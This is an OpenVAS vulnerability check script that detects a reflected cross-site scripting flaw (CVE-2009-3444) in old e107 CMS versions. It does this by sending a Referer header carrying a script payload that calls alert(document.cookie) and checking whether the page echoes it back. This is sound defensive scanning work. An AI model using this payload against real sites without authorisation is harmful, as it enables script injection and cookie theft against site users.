###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_e107_referer_xss_vuln.nasl 15 2013-10-27 12:49:54Z jan $
#
# e107 'Referer' Header Cross-Site Scripting Vulnerability
#
# Authors:
# Nikita MR <rnikita@secpod.com>
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Attackers can exploit this issue to execute arbitrary HTML and script code
  in a user's browser session in the context of an affected site.
  Impact Level: Application";
tag_affected = "e107 version 0.7.16 and prior.";
tag_insight = "The flaw exists due to error in 'email.php' in 'news.1' action. It does not
  properly filter HTML code from user-supplied input in the HTTP 'Referer'
  header before displaying the input.";
tag_solution = "Upgrade to e107 version 0.7.22 or later,
  For updates refer to http://e107.org/edownload.php";
tag_summary = "This host is running e107 and is prone to remote Cross-Site
  Scripting vulnerability.";

if(description)
{
  script_id(800946);
  script_version("$Revision: 15 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2009-10-08 08:22:29 +0200 (Thu, 08 Oct 2009)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_cve_id("CVE-2009-3444");
  script_name("e107 'Referer' Header Cross-Site Scripting Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://websecurity.com.ua/3528/");
  script_xref(name : "URL" , value : "http://www.vulnaware.com/?p=17929");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/36832/");

  script_description(desc);
  script_summary("Validate through the attack string");
  script_category(ACT_MIXED_ATTACK);
  script_copyright("Copyright (C) 2009 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");

ePort = get_http_port(default:80);
if(!ePort){
  exit(0);
}

if(safe_checks()){
  exit(0);
}

foreach dir (make_list("/", "/e107", "/cms", cgi_dirs()))
{
  sndReq = string('GET ' + dir + '/email.php?news.1 HTTP/1.1\r\n',
                  'Host: ', get_host_name(),'\r\n',
                  'Referer: ><script>alert(document.cookie)</script>\r\n',
                  '\r\n');

  rcvRes = http_send_recv(port:ePort, data:sndReq);
  if(egrep(pattern:"^HTTP/.* 200 OK", string:rcvRes) &&
     "alert(document.cookie)" >< rcvRes)
  {
    security_warning(ePort);
    exit(0);
  }
}
